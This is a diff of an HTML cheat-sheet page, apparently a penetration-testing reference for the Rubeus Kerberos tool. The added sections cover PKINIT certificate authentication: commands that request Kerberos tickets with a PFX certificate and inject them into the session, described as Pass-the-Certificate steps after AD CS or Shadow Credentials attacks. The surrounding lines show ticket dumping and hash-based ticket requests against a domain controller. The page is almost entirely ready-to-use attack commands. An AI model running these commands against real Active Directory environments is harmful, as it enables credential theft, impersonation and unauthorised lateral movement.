@@ -38,10 +38,10 @@
             const path_to_root = "../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../searchindex-45f66119.js";
+            window.path_to_searchindex_js = "../searchindex-4f962408.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="../toc-9a594cb9.js"></script>
+        <script src="../toc-22248eaf.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -208,6 +208,15 @@
 </table>
 </div>
 <hr>
+<h2 id="pkinit-certificate-authentication"><a class="header" href="#pkinit-certificate-authentication">PKINIT (Certificate Authentication)</a></h2>
+<h3 id="request-tgt-with-pfx-certificate"><a class="header" href="#request-tgt-with-pfx-certificate">Request TGT with PFX Certificate</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /certificate:&lt;path_or_base64&gt; /password:&lt;pfx_password&gt; /nowrap
+</code></pre>
+<h3 id="request-tgt-with-pfx-and-import"><a class="header" href="#request-tgt-with-pfx-and-import">Request TGT with PFX and Import</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /certificate:C:\cert.pfx /password:CertPass123 /ptt
+</code></pre>
+<p><strong>Note:</strong> Used in Pass-the-Certificate attacks after obtaining a certificate from AD CS exploitation or Shadow Credentials attacks.</p>
+<hr>
 <h2 id="ticket-harvesting"><a class="header" href="#ticket-harvesting">Ticket Harvesting</a></h2>
 <h3 id="dump-all-tickets-base64"><a class="header" href="#dump-all-tickets-base64">Dump All Tickets (Base64)</a></h3>
 <pre><code class="language-cmd">Rubeus.exe dump /nowrap
@@ -237,6 +246,12 @@
 </code></pre>
 <h3 id="request-tgt-using-domain-controller"><a class="header" href="#request-tgt-using-domain-controller">Request TGT Using Domain Controller</a></h3>
 <pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /rc4:&lt;hash&gt; /dc:&lt;dc_ip&gt; /nowrap
+</code></pre>
+<h3 id="request-tgt-with-certificate-pkinit"><a class="header" href="#request-tgt-with-certificate-pkinit">Request TGT with Certificate (PKINIT)</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /certificate:&lt;base64_or_path&gt; /password:&lt;pfx_password&gt; /nowrap
+</code></pre>
+<h3 id="request-tgt-with-certificate-file"><a class="header" href="#request-tgt-with-certificate-file">Request TGT with Certificate File</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /certificate:C:\path\to\cert.pfx /password:&lt;pfx_password&gt; /ptt
 </code></pre>
 <hr>
 <h2 id="pass-the-ticket-ptt"><a class="header" href="#pass-the-ticket-ptt">Pass the Ticket (ptt)</a></h2>
